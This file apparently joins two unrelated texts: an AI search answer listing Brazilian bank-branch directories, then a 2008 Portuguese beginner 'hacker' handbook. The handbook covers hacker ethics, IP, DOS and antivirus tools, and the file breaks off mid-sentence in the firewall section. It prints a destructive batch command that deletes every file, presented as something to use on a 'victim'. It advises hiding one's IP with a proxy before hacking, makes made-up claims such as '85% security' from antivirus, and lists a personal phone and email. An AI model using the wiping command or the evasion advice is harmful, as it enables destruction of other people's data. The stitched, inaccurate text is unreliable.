@@ -1,0 +1,2458 @@
+
+Conversa no Modo IA
+
+
+Você disse: sites bancos todas cidadessites bancos todas cidades
+
+      
+       Para encontrar sites que listam agências bancárias, endereços, telefones e horários em todas as cidades do Brasil, você pode utilizar as seguintes ferramentas oficiais e diretórios especializados:
+• Banco Central do Brasil - Encontre uma Instituição: A base oficial do governo para consultar instituições autorizadas, reguladas ou supervisionadas, verificar dados cadastrais e canais de atendimento.
+• FEBRABAN - Busca Banco: Plataforma oficial da Federação Brasileira de Bancos com estatísticas e localização de agências e postos por município e região.
+• Agências Bancárias: Site que organiza contatos, endereços e códigos de agências por estado e cidade para os principais bancos do país.
+• Bancos e Agências: Diretório para localizar bancos, agências, endereços e telefones em diferentes municípios brasileiros.
+Se você está procurando uma cidade específica ou um banco em particular (como Bradesco, Itaú, Banco do Brasil ou Caixa), me informe qual é para que eu possa te ajudar com os detalhes ou contatos.
+Banco Central do Brasil
+Encontre uma instituição regulada/supervisionada pelo BC
+Consulta do BC: Lista de instituições autorizadas, reguladas ou supervisionadas pelo Banco Central do Brasil para verificar cadastro, evitar golpes e consultar ...
+Busca Banco
+FEBRABAN - Busca Banco
+Busca Banco. Home Estatísticas Feriados Bancários · Home Estatísticas Feriados Bancários. Escolha a opção de estatística desejada. · Agências e Postos por Regiã...
+www.agenciasbancos.com
+Agências bancárias: endereços, contatos e códigos bancários
+Para facilitar o usuario, os contatos das agências dos bancos são organizados por estado e por cidade ou por banco, de manera que você pode encontrar rapidament...
+bancoseagencias.com.br
+Bancos e agências por cidade
+Encontre bancos e agências por cidade no Brasil, com endereço, telefone e dados cadastrais.
+Introdução .......................................................................................................... 07
+Capitulo 1- Entendendo do assunto
+O que é ser um Hacker? ..................................................................................... 09
+O que é preciso para ser um Hacker ? ............................................................... 10
+Pensando como um Hacker ................................................................................ 12
+Ética Hacker ........................................................................................................ 14
+Termos Hacker .................................................................................................... 15
+O que é IP ? ........................................................................................................ 17
+O que é o DOS ? ................................................................................................. 18
+Capitulo 2- Segurança
+Antivírus ............................................................................................................... 21
+Anti Spyware ........................................................................................................ 23
+Firewall ................................................................................................................. 24
+Senhas seguras ................................................................................................... 26
+Criptografia ............................................................................................................ 27
+www.mundodoshacker.com pagina. 2 Apostila Para Hackers Iniciantes > Índice Profº Paulo
+Capitulo 3- Rede
+O que é uma rede de computadores? ................................................................. 33
+Equipamentos para montar uma rede doméstica básica ...................................... 35
+Capitulo 4- Servidores
+Servidor Web ....................................................................................................... 40
+Servidor de arquivos ............................................................................................ 41
+Servidor de e-mail ................................................................................................ 42
+Servidor Webmail ................................................................................................. 43
+Servidor de banco de dados ................................................................................ 44
+Servidor de Impressão ......................................................................................... 45
+Servidor DNS ....................................................................................................... 46
+Servidor FTP ........................................................................................................ 47
+Servidor de imagens ............................................................................................ 48
+Servidor Proxy ...................................................................................................... 49
+Capitulo 5- Hacker
+Trojans ................................................................................................................... 52
+Keyloggers ............................................................................................................. 53
+Worms .................................................................................................................... 54
+www.mundodoshacker.com pagina. 3 Apostila Para Hackers Iniciantes > Índice Profº Paulo
+Rootkits .................................................................................................................. 55
+Ransomware .......................................................................................................... 56
+Adwares ................................................................................................................. 57
+Hijackers ................................................................................................................ 58
+Scanner .................................................................................................................. 59
+Sniffer ..................................................................................................................... 60
+Spoofing .................................................................................................................. 61
+DOS (Denial Of Service) ......................................................................................... 62
+SPAM ……………………………………………………………………………………... 64
+Exploits .................................................................................................................... 66
+SQL Injection ........................................................................................................... 67
+Google ..................................................................................................................... 68
+Defacer .................................................................................................................... 70
+Conexão reversa ..................................................................................................... 71
+Proxy ........................................................................................................................ 72
+DNS Poisoning ........................................................................................................ 73
+Phishing ................................................................................................................... 74
+Buffer Overflow (estouro de pilhas) ......................................................................... 75
+Replay ...................................................................................................................... 76
+Scripts ...................................................................................................................... 77
+Brute Force .............................................................................................................. 79
+Nuke ......................................................................................................................... 80
+www.mundodoshacker.com pagina. 4 Apostila Para Hackers Iniciantes > Índice Profº Paulo
+Capitulo 6- Um pouco de Linux
+O que é Linux? ........................................................................................................ 83
+Linux VS Windows ................................................................................................... 85
+Linux é para Hackers ? ............................................................................................ 87
+Produtos Mundo Dos Hackers
+Curso de Hacker Mundo Dos Hackers ..................................................................... 90
+Pacote Hacker Mundo Dos Hackers ........................................................................ 92
+Kit Informática Mundo Dos Hackers ......................................................................... 93
+Camisetas Mundo Dos Hackers ............................................................................... 94
+Apostilas Impressas Mundo Dos Hackers ................................................................ 95
+Perguntas e respostas .............................................................................................. 96
+Conclusão
+Conclusão .............................................................................................................. 100
+www.mundodoshacker.com pagina. 5 Apostila Para Hackers Iniciantes Profº Paulo
+www.mundodoshacker.com pagina. 6 Apostila Para Hackers Iniciantes > Introdução Profº Paulo
+ Eu resolvi fazer essa apostila para conscientizar, quem esta começando na área 
+de Hacking, e também pelo enorme numero de pedidos :D! 
+ Essa apostila ira tratar sobre todos os assuntos e termos usados em 
+Hackearismo, desde segurança até invasão, e um pouquinho de Linux, mas não 
+pense que só essa apostila basta, “mesmo sabendo muito não se sabe tudo!!!”. Todo 
+conteúdo desta apostila é legal, caso aja algum conteúdo ilícito entre em contato 
+comigo pelo e-mail: paulotacio@mundodoshackers.x-br.com , que eu resolverei o 
+problema.
+ Atenção: Esta apostila não mostra como fazer e sim ensina o que é cada 
+assunto tratado. Caso você queira aprender como efetuar cada técnica e se 
+aprofundar mais em hackearismo, faça pedido do Curso de Hacker Mundo Dos 
+Hackers, pelo site: www.mundodoshacker.com , fora o curso de hacker temos também 
+outros produtos, entre no site e consulte nossos produtos. Obs: Eu acho que é 
+desnecessário eu falar que o conteúdo aprendido no curso é legal, e não deve ser 
+usado para atos ilícitos não é ? ;D.
+ Para boa aprendizagem, e melhor aproveitamento do assunto leia com atenção 
+essa apostila. Caso você tenha alguma dúvida eu estarei aberto para esclarecimentos, 
+você pode entrar em contato comigo pelo telefone: (11) 7427-1943 ou pelo e-mail: 
+paulotacio@mundodoshackers.x-br.com .
+ Comunidade Mundo Dos Hackers 
+http://www.orkut.com/Community.aspx?cmm=34107839
+ Comente sobre essa apostila na comunidade Mundo Dos Hackers ou mandando 
+um e-mail para mim, elogios sempre são bem vindos (“são os elogios que dão força e 
+animo, para criar mais e mais conteúdo para estudo!”) Mas também estou aberto para 
+criticas.
+ 
+ Boa leitura!!!
+www.mundodoshacker.com pagina. 7 Apostila Para Hackers Iniciantes > Capitulo 1 Profº Paulo
+www.mundodoshacker.com pagina. 8 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 9 Apostila Para Hackers Iniciantes > O que é ser um Hacker? Profº Paulo
+ Hacker são pessoas comuns, a única coisa que tem de deferente, é a sua 
+grande capacidade de compreensão e manuseio de assuntos referente a informática, 
+capacidade essa que não foi adquirida do dia para a noite, capacidade essa que não 
+nascemos com ela, tudo vem com tempo e estudo, com os erros vem os acertos, com 
+os estudos vem a inteligência e com a pratica vem a perfeição. 
+ Ser um Hacker não é ser um invasor de privacidade, e muito menos um ladrão 
+virtual que rouba informações e dinheiro, ser um hacker é ter consciência de seus atos 
+e saber até aonde eles podem te levar, ser um hacker é invadir para fins de estudo e 
+não destruição, ser um hacker é saber que o direito de saber não te da direito de 
+fazer, ser um hacker é ser uma pessoa que usa o seu conhecimento para fins de 
+melhoramentos em softwares e hardwares com a intenção de ajudar cada vez mais a 
+evolução digital, ser um hacker é ter consciência de que se desligar do mundo real e 
+da sociedade não lhe ajudara em nada, pois quanto mais gente você conhece e se 
+relaciona, maior fica sua auto estima e capacidade de pensar, ser um hacker é saber 
+que nunca se sabe tudo e que nunca se sabe nada, ser um hacker é saber que nunca 
+deve subestimar uma pessoa ou um sistema, ser um hacker é saber a hora de parar 
+de escrever coisas que são meias que obvio e que estão fazendo o leitor dormir :D.
+ Normalmente um Hacker não assume que é um hacker, mas como cada um tem 
+sua cabeça e pensamento, quando alguém me pergunta se eu sou um Hacker eu digo 
+que sim! É claro que eu não falo isso para todos, e sim para alunos, amigos, curiosos, 
+em fim, afinal se eu não sei se sou um hacker quem é que vai saber? Eu não tenho 
+porque temer em dizer que sou um hacker, afinal ser um hacker não é crime, e 
+ninguém pode me processar ou me prender só por que eu disse que sou um hacker. 
+Um hacker tem que ter confiança no que faz , se você não sabe fazer diga apenas “eu 
+não sei”, eu garanto que dizer isso não dói nem um pouquinho, ninguém sabe tudo. 
+Chega um certo ponto que você já pode se considerar um hacker, caso contrario não 
+existirá nenhum hacker, já que todos hackers falam que não são hackers.
+ Concluindo ser um Hacker não é ser um bandido nem infrator de leis, ser um 
+hacker é apenas ser uma pessoa, que tem não só uma grande habilidade em 
+informática, e sim também uma mente aberta para o mundo, dons esses que serão 
+melhorados e usados apenas para o bem.
+www.mundodoshacker.com pagina. 10 Apostila Para Hackers Iniciantes > O que é preciso para ser um Hacker? Profº Paulo
+ O fator principal que uma pessoa que quer ser um Hacker deve ter é “cede de 
+conhecimento”, tendo isso tudo ficara mais fácil! Como foi dito acima um Hacker é 
+uma pessoa que tem um grande conhecimento em informática. Você deve ler bastante 
+sobre assuntos relacionados a informática, e também estar sempre por dentro de 
+sites, noticias, comunidades e fóruns Hackers, eu digo comunidades e fóruns que 
+realmente queiram tratar do assunto seriamente, e não aqueles fóruns e comunidades 
+que foram feitos apenas para xingar os membros de lammers, noobs, burros,
+&¨&#¨@%&¨%# e outras ofensas, esse tipo de ajuda você recusa e desconsidera. 
+ Estude de tudo um pouco, leve essa apostila 
+como o começo de um tudo, e sem duvida tente 
+entender pelo menos o básico de programação que 
+mais dia menos dia isso será necessário. Tenha 
+sempre muita paciência e dedicação, errou uma 
+vez, faça de novo, errou de novo faça outra vez, e 
+assim vai, não será do dia para noite que você ira 
+se tornar um Hacker Fodão! Quando você tiver 
+plena confiança no que esta fazendo e já ter um 
+conhecimento bem avançado, ai sim você poderá 
+se considerar um (a) Hacker, tudo vem com tempo, 
+mas não é por isso que você deve ficar sentado esperando o tempo passar :D.
+ Uma coisa muito importante, é que você nunca deve falar dos seus atos como 
+Hacker para ninguém, nem para seus amigos, pois nunca se sabe o que um amigo 
+realmente pensa de você e suas verdadeiras intenções. 
+ Em questão de computador, não é necessário ter um computador todo equipado 
+para hackear, e muito menos banda larga, não sendo um Pentium 1 com 64 de 
+memória RAM, esta bom, quanto a conexão, se você tiver uma conexão discada bem, 
+www.mundodoshacker.com pagina. 11 Apostila Para Hackers Iniciantes > O que é preciso para ser um Hacker? Profº Paulo
+se tiver banda larga melhor ainda, só não recomendo as conexões por rádio, quanto 
+ao sistema operacional o ideal é ter o Windows e o Linux, mas se você não tiver o 
+Linux não tem problema afinal hacker que é hacker consegue acessar uma conta 
+Shell em maquina Unix mesmo com Windows :D. 
+Abaixo segue uma lista de livros e filmes Hackers que são muito importante para 
+quem esta começando e para dar animo. Atenção: eu disse animo e não fantasia.
+Livros:
+A arte de Invadir - Kevin Mitnick
+A arte de enganar - Kevin Mitnick
+Guia do Hacker Brasileiro - Marcos Flávio Araújo Assunção
+Algoritmos Programação Para Iniciantes - Gilvan Vilarim 
+Filmes: 
+Duro de Matar 4.0
+Hackers 
+CAOS
+Piratas do Vale do cilício 
+Matrix (clássico) 
+ Esses são alguns livros e filmes Hackers.
+ 
+ 
+www.mundodoshacker.com pagina. 12 Apostila Para Hackers Iniciantes > Pensando como um Hacker Profº Paulo
+ O que passa na cabeça de um hacker ? Quais os seus pensamentos na hora em 
+que esta fazendo uma invasão ? Se você realmente quer ser um Hacker é bom que 
+você comece a pensar como um. Cientistas comprovaram com estudos que o ser 
+humano usa apenas um sétimo (1/7) de sua capacidade mental, ou seja, se você usar 
+dois sétimos (2/7) de sua capacidade mental você será um gênio ? Qual seria a 
+capacidade mental de Albert Aistem ?
+Para ser um Hacker não é necessário ser um gênio, mas é inegável que para ser um 
+hacker precisa-se ser inteligente, mas é importante não esquecermos que ninguém 
+nasce inteligente, e sim vai adquirindo conhecimento com estudos e dedicação. 
+ Para que você possa pensar como um hacker comece tentando associar tudo 
+em sua volta, tentando entender como que cada coisa 
+se encaixa. Um bom exemplo é o de um ladrão de 
+casas! Quando ele esta prestes a assaltar uma casa o 
+que ele faz ? Ele não sai quebrando a porta com uma 
+pesada, e nem a janela com uma pedrada, 
+normalmente ele irá procurar pela chave da casa nos 
+lugares mais óbvios como: de baixo do tapete, encima 
+da calha, dentro do vaso de planta, em fim. Caso ele 
+não ache a chave ele irá procurar por possíveis 
+vulnerabilidades na casa, de maneira que ele possa 
+entrar sem ser notado, um bom exemplo de 
+vulnerabilidade em uma casa é aquela chave que você 
+deixa na porta dos fundos, aquela porta com o buraco 
+da fechadura enorme, se o ladrão notar essa vulnerabilidade ele ira se aproveitar dela 
+pegando um jornal e um arame, com isso ele poderá passar o jornal por de baixo da 
+porta, e empurrar a chave com o arame, para que ela caia em cima do jornal, feito isso 
+basta ele puxar o jornal com a chave e abrir a porta! Antes que você me mande um e-
+mail ou scrap perguntando, não eu nunca roubei nenhuma casa :D!!! Obs: Esse foi 
+apenas um exemplo!!!
+ Um Hacker tem que pensar mais ou menos desse jeito, tentando sempre estar 
+um passo a frente do alvo. 
+ 
+www.mundodoshacker.com pagina. 13 Apostila Para Hackers Iniciantes > Pensando como um Hacker Profº Paulo
+ Leia as frases abaixo:
+A mãe deu um chuva para o seu filho 
+Quem você trás para perto de você revela o seu presente
+Amigos de verdade te acompanha até de baixo de caráter 
+ 
+ Agora vamos ver se você esta se saindo bem nos seus estudos Hacker, e se já 
+esta pensando como um!!!
+ O que foi que eu escrevi no inicio do segundo parágrafo ? Caso você não se 
+lembra, eu vou lhe ajudar, eu escrevi o seguinte: “Para que você possa pensar como 
+um hacker comece tentando associar tudo em sua volta, tentando entender como que 
+cada coisa se encaixa”.
+ Agora me responda, o que você fez ao ler as frases acima ? Se você associou 
+as frases e tentou encaixar as palavras nos lugares certos, meus parabéns, você se 
+saiu muito bem. Mas se você foi lendo as frases sem nem parar para pensar, você 
+não esta pensando como um hacker, e pior que isso você não esta lendo essa 
+apostila com atenção : ( . As frases acima na verdade são da seguinte forma: 
+A mãe deu um presente para o seu filho 
+Quem você trás para perto de você revela o seu caráter 
+Amigos de verdade te acompanha até de baixo de chuva
+ O que acontece é que muitas pessoas não param para pensar no que esta 
+acontecendo em sua volta, isso é que faz na maioria das vezes um programador 
+deixar uma brecha sem nem perceber. 
+ Independente se você associou ou não as frases, creio eu que de agora em 
+diante você vai ler essa apostila com mais atenção não é :D?
+ Você deve pensar que sempre tem uma vulnerabilidade, se não tem agora, um 
+dia terá!
+www.mundodoshacker.com pagina. 14 Apostila Para Hackers Iniciantes > Ética Hacker Profº Paulo
+ 
+ Quando falamos de ética o que vem em sua cabeça? E quando falamos de ética 
+Hacker, o que vem a sua cabeça? 
+ Hoje em dia nos temos vários tipos de éticas, que se adequada a todos os tipos 
+de situações, mais dia ou menos dia você terá que usar a ética, as vezes 
+você a usa até sem perceber! É como aquela velha historia: “Acontece nas 
+melhores e piores famílias” :D. Já que usamos tanto a ética porque não 
+termos uma para ser aplicada a ações Hacker ?
+ A ética Hacker surgiu nas comunidades virtuais e veio em boa hora. Com o 
+aumento de hackers e ações hackers, estava meio que difícil de controlar o que é 
+certo e o que não é, ainda mais com a mídia sujando cada vez mais a imagem dos 
+hackers. Um dos seus grandes criadores foi o Finlandês Pekka Himanen. Até hoje a 
+ética hacker é seguida pela maioria dos Hackers. Lembrando, ética hacker não é uma 
+lei, segue quem quer, isso vai depender do bom senso de cada um, é como uma ética 
+profissional, não são todos que seguem.
+ A ética Hacker hoje em dia consiste basicamente nos termos abaixo:
+1. Acreditar que o compartilhamento de informações beneficia a sociedade como um 
+todo. Portanto os hackers compartilham suas experiências e programam software 
+livres, facilitando o acesso à informação e os recursos disponíveis para computadores 
+sempre que possível. A máxima hacker é "A informação quer ser livre". Este conjunto 
+de crenças deriva em parte do pensamento de Buckminster Fuller, o qual proferiu 
+certa vez que "A verdadeira riqueza é a informação e saber como utilizá-la".
+2. Acreditar que penetrar em sistemas por diversão e exploração é eticamente 
+aceitável , desde que não cometa roubo, vandalismo ou quebre a confidencialidade. 
+(Esse princípio não é unânime, alguns consideram a simples invasão uma ação não 
+ética.)
+ Quem segue a ética hacker hoje em dia ? A maioria dos Hackers, mas os que 
+não seguem não deixam de ser hackers. É a mesma coisa que um médico, se ele 
+respeitar a ética ele é um excelente médico, mas se ele não a respeita, ele não deixa 
+de ser um ótimo médico, ele apenas não concorda com o que a ética impõem a ele,
+mas pode ter sua licença de médico cassada. A única diferencia é que Hackers não 
+tem licenças para serem casadas :D!
+ 
+www.mundodoshacker.com pagina. 15 Apostila Para Hackers Iniciantes > Termos Hacker Profº Paulo
+ Em hacking temos alguns termos que são usados para classificar o estagio de 
+um aprendiz de hacker e algumas ações hackers. Esses termos não são usados 
+apenas por hackers, e sim por quem quiser, já que quem tem boca fala o que quer, e 
+quem tem mão digita o que quiser :D. Por isso não fique ofendido se alguém te 
+chamar de lammer ou noob.
+ Esses são alguns dos termos hackers usados atualmente:
+White hat - (hacker ético) hacker em segurança, utiliza os seus conhecimentos na 
+exploração e detecção de erros de concepção, dentro da lei. A atitude típica de um 
+white hat assim que encontra falhas de segurança é a de entrar em contacto com os 
+responsáveis pelo sistema, comunicando do fato. Geralmente, hackers de chapéu 
+branco violam seus próprios sistemas ou sistemas de um cliente que o empregou 
+especificamente para auditar a segurança. Pesquisadores acadêmicos e consultores 
+profissionais de segurança são dois exemplos de hackers de chapéu branco.
+Gray hat - Tem as habilidades e intenções de um hacker de chapéu branco na maioria 
+dos casos, mas por vezes utiliza seu conhecimento para propósitos menos nobres. 
+Um hacker de chapéu cinza pode ser descrito como um hacker de chapéu branco que 
+às vezes veste um chapéu preto para cumprir sua própria agenda. Hackers de chapéu 
+cinza tipicamente se enquadram em outro tipo de ética, que diz ser aceitável penetrar 
+em sistemas desde que o hacker não cometa roubo, vandalismo ou infrinja a 
+confidencialidade. Alguns argumentam, no entanto, que o ato de penetrar em um 
+sistema por si só já é anti-ético (ética hacker).
+Black hat - (cracker ou dark-side hacker) criminoso ou malicioso hacker, um cracker. 
+Em geral, crackers são menos focados em programação e no lado acadêmico de 
+violar sistemas. Eles comumente confiam em programas de cracking e exploram, não 
+tem domínio dos conhecimentos de programação. É pouco experiente, com poucas 
+noções de informática, porém tenta fazer-se passar por um cracker a fim de obter 
+fama, o que acaba gerando antipatia por parte dos hackers verdadeiros. Cerca de 
+95% dos ataques virtuais são praticados por script kiddies.
+Newbie - Newbie, Noob ou a sigla NB, é aquele jovem aprendiz de hacker que possui 
+uma sede de conhecimento incrivel, pergunta muito e é ignorado e ridicularizado 
+maioria das vezes, ao contrario dos lammers não tenta se pôr acima dos outros, 
+geralmente é muito simples e possui uma personalidade ainda fraca.
+ 
+www.mundodoshacker.com pagina. 16 Apostila Para Hackers Iniciantes > Termos Hacker Profº Paulo
+Phreaker - Os phreakers são basicamente os hackers ou crackers da telefonia móvel 
+(celular), como os hackers os phreakers podem ajudar na correção de softwares e/ou 
+sistemas de celulares ou podem apenas invadir e aplicar golpes.
+Cracker - Tanto pode ser entendido como pessoa com amplo conhecimento em 
+sistemas operacionais que usa seus conhecimentos para o "mal" como pode ser 
+também especialista em encontrar falhas de segurança ou decifrar códigos. Os 
+crackers são os verdadeiros vilões da historia, já sujarão e vem sujando a imagem que 
+a sociedade tem de um “Hacker”.
+Script Kiddie - (garoto dos scripts, numa tradução literal). Os script Kiddies são como 
+aprendizes de crackers, não possuem conhecimento em programação e não são 
+interessados na evolução e o bem da tecnologia, pensam apenas em obter fama e 
+outros tipos de lucros pessoais. “São apenas aventureiros inexperientes no mundo 
+virtual”.
+Lammer - Esse termo já é bem conhecido por muitos! Um lammer como um Script 
+Kiddie não tem conhecimento em programação e não possuem uma personalidade e 
+nem objetivo claro, se dizem autodidatas mas sempre estão a procura de ajuda. Os 
+Lammers na maioria das vezes tentam se passar por Hackers.
+Espertão - Esse termo foi eu que inventei e não é reconhecido ainda como um termo 
+hacker. O espertão em hackearismo é basicamente aquele sujeito que pensa que 
+sabe tudo, mas não sabe nada, não quer ajuda de ninguém, e pensa que porque 
+aprendeu a usar um trojan já pode invadir a NASA.
+ 
+ 
+www.mundodoshacker.com pagina. 17 Apostila Para Hackers Iniciantes > O que é IP? Profº Paulo
+ IP (Internet Protocol – Protocolo de Internet ) O IP é um protocolo usado entre 
+duas ou mais maquinas para encaminhamento de dados. Um computador recebe um 
+numero de IP quando esta em rede e/ou quando é conectado a Internet. Em rede um 
+computador recebe um numero de IP que o administrador deve definir, para que os 
+computadores possam se comunicar entre si, exemplo: em uma rede de 4 
+computadores e um servidor, o PC servidor normalmente é o primeiro a receber o nº 
+de IP: Servidor: 192.168.0.1 os outros PCs recebem o mesmo numero de IP só que 
+com o final diferente: PC1: 192.168.0.2 PC2: 192.168.0.3 PC3: 192.168.0.4 PC4:
+192.168.0.5
+ Dessa forma qualquer maquina da rede pode se comunicar com outra maquina 
+que também esteja na rede. Acontece que o IP é um endereço que o PC recebe, 
+sendo assim, quando o PC1 quer se comunicar com o PC3, basta o PC1 buscar pelo 
+IP: 192.168.0.4.
+ Em questão a Internet o seu PC recebe 
+um IP automaticamente, esse IP será o 
+responsável por possibilitar o seu PC a 
+acessar paginas, ler e-mails, acessar o MSN, 
+fazer Downloads, etc. Na internet o seu IP 
+representa o seu endereço real, apesar de 
+muitos falarem que isso são boatos, nunca é 
+bom confiar. Quando você acessa sites, 
+comunicadores instantâneos, faz downloads, 
+em fim, o seu IP fica gravado, por isso que 
+antes de fazer alguma ação hacker que 
+possa lhe complicar, você deve alterar o seu 
+numero de IP usando um Proxy.
+ Como já foi dito o IP é o endereço de uma maquina que esta conectada a 
+internet ou que esta em rede, por tanto para efetuar uma invasão seja ela qual for, é 
+indispensável saber o numero de IP do computador alvo, a não ser que você queira
+que o seu computador fique perdido na periferia da internet :D.
+ Concluindo, sem IP seria impossível a rede mundial de computadores (Internet) 
+existir.
+ 
+www.mundodoshacker.com pagina. 18 Apostila Para Hackers Iniciantes > O que é DOS? Profº Paulo
+ DOS (Disk Operating System - Sistema Operacional de Disco)
+ O DOS é um antigo sistema operacional que ainda é presente nos 
+computadores de hoje, só que é menos usado. Com o DOS você pode dar comandos 
+para diversos fins como: DIR= Mostra o conteúdo do seu HD, COPY= Copia pastas e 
+arquivos DEL= Deleta arquivos FORMAT = Formata HD ou Disquete, MD= cria 
+pastas, EDIT= Edita arquivos de texto, RD= Exclui pastas, entre outros comandos, 
+antigamente o DOS era indispensável para qualquer PC, já que eles não contavam 
+com Sistemas Operacionais com interfase gráfica, para criarem arquivos, fazer 
+backup, formatar, deletar arquivos e pastas era tudo na base dos comandos. O DOS 
+não é muito utilizado hoje em dia por motivos óbvios, porem em hackearismo o DOS 
+ou Prompt de comando ainda é muito utilizado, um bom exemplo é para compilar e
+rodar um exploit, sem o DOS é impossível, a não ser que você pegue um exploit já 
+compilado e em formato executável “.exe”, coisa que não é recomendável, pois você 
+não ira ver o código fonte do exploit.
+ 
+ Você pode executar o DOS no Windows XP a partir de iniciar/execultar/cmd ou 
+iniciar/todos os programas/acessórios/prompt de comando . 
+ Com o DOS nos podemos também criar os famosos vírus badcoms (.bat), os 
+vírus .bat é um arquivo com linhas de comandos que podem fazer desde uma simples 
+ação como desligar o seu computador até uma ação mais destrutiva como formatar o 
+seu computador ou o da vitima, os comandos usados nos badcoms são os simples 
+comandos do DOS como: “del”, “dir”, etc. Quando um badcom é executado ele da os 
+comandos programados para o seu computador e o seu computador inocentemente
+executa os comandos. Um exemplo simples de um badcom é destrutivo é o seguinte:
+Cls 
+@deltree /y *.* > nul
+ Criando um arquivo .bat com esse comando e o executando, o programa 
+primeiro limpará a tela e logo depois usará o comando deltree para apagar os arquivos 
+e pastas do computador. Resumindo! Todas as suas pastas e arquivos serão 
+excluídos sem você nem perceber :P.
+www.mundodoshacker.com pagina. 19 Apostila Para Hackers Iniciantes > O que é DOS? Profº Paulo
+ O DOS ficou como herança para os nossos filhos, netos, tataranetos darem 
+risada e falar: Credo que tela feia é essa, isso é um Sistema Operacional ?
+A não ser que eles queiram ser hackers, ai a coisa muda de figura :D! 
+www.mundodoshacker.com pagina. 20 Apostila Para Hackers Iniciantes > Capitulo 2 Profº Paulo
+www.mundodoshacker.com pagina. 21 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 22 Apostila Para Hackers Iniciantes > Antivírus Profº Paulo
+ Um antivírus é um software (programa) que tem como objetivo proteger o seu 
+computador de vírus como cavalo de tróia e worms, a maneira que um antivírus usa 
+para detectar os vírus é através de escanneamentos de pastas e/ou arquivos. Mas 
+como que um antivírus consegue detectar e apagar um vírus? 
+ O antivírus tem um banco de dados com informações de vírus (basicamente são 
+como “fotos” dos vírus), portanto, o que o antivírus tem que fazer é apenas comparar o
+código fonte (“foto”) do arquivo supostamente infectado com o seu banco de dados, 
+caso o código fonte do arquivo seja idêntico a um dos códigos fontes do banco de
+dados do antivírus, o antivírus ira alertar o usuário do computador com uma 
+mensagem de que o arquivo esta infectado e mostrara também o nome do vírus, caso 
+o código fonte do arquivo não seja idêntico a um dos códigos fontes do antivírus, o 
+antivírus ira mostrar para usuário um mensagem dizendo que o arquivo não contem 
+vírus e que é confiável, essa comparação é feita em milésimos de segundos, e é bem
+detalhada, o código fonte do vírus tem que ser idêntico ao do banco de dados do 
+antivírus para que não haja nem um alerta de infecção falso.
+ Um antivírus deve ser atualizado diariamente, ou até em 3 e 3 horas, para que o 
+banco de dados de vírus do antivírus esteja sempre por dentro dos últimos vírus, e 
+possa então detecta-los assim que houver alguma ação 
+maliciosa em seu computador. Quando um antivírus esta 
+sendo atualizado, o que esta acontecendo é um download de 
+informações sobre vírus, informações essas que são 
+armazenada no servidor do fabricante do antivírus, ou seja o 
+seu antivírus se conecta ao servidor do seu fabricante e 
+começa a procurar por novas atualizações, comparando a 
+última data em que foi feita a atualização com as datas de 
+atualizações que o servidor tem a lhe oferecer, exemplo:
+Se a última data de atualização do seu antivírus foi no dia: 7/03/2008 e a última data 
+da atualização que o servidor tem a lhe oferecer é: 10/03/2008 o seu antivírus irá 
+baixar todas as atualizações desde o dia 08/03 até 10/03.
+ Com um antivírus atualizado você tem 85% de garantia de segurança, só não é 
+100 % pelo fato de você estar sujeito a novos vírus que não foram descobertos, e por 
+isso o código fonte do novo vírus não foi ainda incluído no banco de dados do seu 
+www.mundodoshacker.com pagina. 23 Apostila Para Hackers Iniciantes > Antivírus Profº Paulo
+antivírus, fora esse problema ainda temos 2 outros que são os vírus espiões como os 
+keyloggers, que a maioria dos antivírus ainda não detectam e os virus indetectáveis. 
+Os vírus indetectaveis ficam de tal maneira, pelo fato de uma modificação intencional 
+em seu código fonte de maneira que não afete o server do vírus, ou pelo uso de algum 
+Joiner (programa que junta um arquivo ao vírus) e/ou um compressor (programa que 
+compressa o server do vírus para que não seja detectado pelo antivírus)
+ Os melhores antivírus disponíveis hoje na Internet para uso domestico são: 
+Kaspersky (gratuito para testar, suporte a língua portuguesa), AVAST (gratuito, 
+suporte a língua portuguesa), AVG (gratuito, suporte a língua portuguesa) e Nod 32
+(gratuito para testar). 
+ Todos os antivírus citados com exceção ao Nod 32, podem ser baixados no site 
+do Mundo Dos Hackers: www.mundodoshacker.com . Você pode fazer download do 
+Nod 32 no site do seu desenvolvedor: http://www.eset.com ou no site Baixaki: 
+www.baixaki.com.br . 
+www.mundodoshacker.com pagina. 24 Apostila Para Hackers Iniciantes > Anti spyware Profº Paulo
+ Um anti spyware é basicamente uma complementação ao antivírus, que não 
+pode ser deixada de lado, a função do anti spyware é te proteger dos vírus espiões, 
+que na maioria das vezes não são detectados pelos antivírus, um bom exemplo de um
+vírus espião são os keyloggers (capitulo 5).
+ Como o antivírus o anti spyware detecta os vírus espiões através de 
+escaneamanetos de pastas e/ou arquivos, comparando o código fonte do suposto 
+arquivo infectado com o seu banco de dados de vírus, essa comparação também é 
+bem detalhada e feita em milésimos de segundos. O anti spyware também deve ser 
+atualizado diariamente, caso contrario não será confiável confiar no anti spyware :D
+pois o anti spyware não estará apto a dizer se um arquivo esta infectado ou não, ele 
+pode até dizer que o arquivo não esta infectado, mas ele não fez uma comparação 
+com todos os vírus já descobertos até a presente data (falando em poucas palavras: O 
+anti spyware não sabe nem se ele existe, quanto menos um vírus em um arquivo :D).
+ Como já foi dito, com um antivírus atualizado você tem 85% de 
+garantia de segurança, agora com um antivírus e um anti spyware 
+atualizado você tem digamos que 90% de garantia de segurança, só 
+não é 100% pelos motivos já ditos. 
+ Hoje em dia há também excelentes anti spywares disponíveis na 
+internet, alguns mais complexos e outros mais simples, os melhores 
+anti spywares para uso domestico são: 
+Spybot (um anti spyware gratuito, em português e muito conhecido), AVG Anti 
+spyware (gratuito para testar, suporte a língua portuguesa), Spyware Doctor (gratuito 
+para testar). 
+ Você pode encontrar o SpyBot e o AVG anti spywate no site do Mundo Dos 
+Hackers: www.mundodoshacker.com . O Spyware Doctor você pode baixar no site do 
+seu desenvolvedor: http://www.pctools.com/ ou no site Baixaki: www.baixaki.com.br
+www.mundodoshacker.com pagina. 25 Apostila Para Hackers Iniciantes > Firewall Profº Paulo
+ Um firewall é como um segurança do seu computador, a função dele é de barrar 
+ações suspeitas como abertura de portas, e monitorar tudo que entra e tudo que sai 
+quando você esta conectado a Internet ou em Rede, o firewall pode também bloquear 
+ações de trojans e/ou keyloggers, porem não pode excluir-los. 
+ Um firewall age basicamente da seguinte forma: “você esta instalando um 
+programa de compartilhamento P2P (Shareaza, Emule, Ares, etc), para que esse tipo 
+de programa consiga compartilhar musicas por exemplo, ele precisa abrir uma 
+determinada porta do seu computador, ai é que o nosso amigo firewall entra, o firewall
